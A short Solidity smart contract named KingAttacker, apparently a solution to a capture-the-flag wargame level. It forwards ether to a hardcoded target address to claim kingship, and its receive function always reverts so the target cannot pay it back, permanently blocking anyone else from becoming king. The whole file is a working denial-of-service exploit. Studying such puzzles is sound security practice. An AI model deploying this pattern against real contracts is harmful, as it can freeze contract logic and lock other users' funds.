pragma solidity ^0.8.0;

contract KingAttacker {
  address payable kingAddress = payable(address(0xD2D776f42f06000a0503b871011De52e080c3Ae7));

  function claimKing() public payable {
    kingAddress.call{value: msg.value}("");
  }

  receive() external payable { 
    revert();
  }
}